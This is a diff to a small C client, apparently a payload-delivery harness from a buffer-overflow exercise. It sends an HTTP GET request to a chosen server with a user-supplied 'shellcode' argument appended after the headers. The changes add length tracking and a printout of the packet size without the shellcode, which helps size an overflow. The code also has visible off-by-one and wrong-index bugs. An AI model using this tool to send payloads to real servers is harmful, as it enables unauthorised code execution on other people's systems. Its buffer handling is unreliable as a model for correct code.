@@ -30,8 +30,10 @@ int main(int argc, char *argv[]) {
     portno = atoi(argv[2]);
     if (argv[3] != NULL)
         page = argv[3];
-    if (argv[4] != NULL)
+    if (argv[4] != NULL && strncmp(argv[4], "ORBIT_SOCKETDIR", 15) != 0)
         shellcode = argv[4];
+    else
+        shellcode = argv[4] = NULL;
     bzero((char *) &serv_addr,sizeof(serv_addr));
     serv_addr.sin_family = AF_INET;
     serv_addr.sin_addr.s_addr = inet_addr(serv_host_addr);
@@ -42,34 +44,45 @@ int main(int argc, char *argv[]) {
     }
 
     char buffer[BUFFER_SIZE];
+    int i;
 
     memset(buffer, '\0', sizeof(buffer));
     memcpy(buffer, "GET /", 5);
+    i = 5;
     if (page != NULL) {
-        memcpy(buffer + 5, page, strlen(page));
-        memcpy(buffer + 5 + strlen(page), default_header, sizeof(default_header)/sizeof(char));
+        memcpy(buffer + i, page, strlen(page));
+        i += strlen(page);
+        memcpy(buffer + i, default_header, sizeof(default_header)/sizeof(char));
+        i += sizeof(default_header)/sizeof(char);
+        printf("Size of packet excluding shellcode: %d\n", i);
         if (shellcode != NULL) {
-            memcpy(buffer + 5 + strlen(page) + sizeof(default_header)/sizeof(char), shellcode, strlen(shellcode));
-        }
+            memcpy(buffer + i, shellcode, strlen(shellcode));
+            i += strlen(shellcode); }
     } else {
-        memcpy(buffer + 5, default_header, sizeof(default_header)/sizeof(char));
+        memcpy(buffer + i, default_header, sizeof(default_header)/sizeof(char));
+        i += sizeof(default_header)/sizeof(char);
+        printf("Size of packet excluding shellcode: %d\n", i);
         if (shellcode != NULL) {
-            memcpy(buffer + 5 + sizeof(default_header)/sizeof(char), shellcode, strlen(shellcode));
+            memcpy(buffer + i, shellcode, strlen(shellcode));
+            i += strlen(shellcode);
         }
     }
 
-    /*int i;
-    for (i = 0; i < 2048; i++)
+    buffer[++i] = '\0';
+    /*printf("buffer len: %d\n", i);
+    int j;
+    for (j = 0; j < i; j++)
       printf("%c", buffer[i]);
     printf("\n");*/
 
-    n = write(sockfd, buffer, sizeof(buffer)/sizeof(char));
+    n = write(sockfd, buffer, i);
     printf("Write status: %d\n", n);
     if (n < 0) {
         printf("Write error.\n");
         exit(1);
     }
 
+    printf("Awaiting response from server..\n");
     bzero(buffer, BUFFER_SIZE);
     n = read(sockfd, buffer, BUFFER_SIZE - 1);
     printf("Read status: %d\n", n);
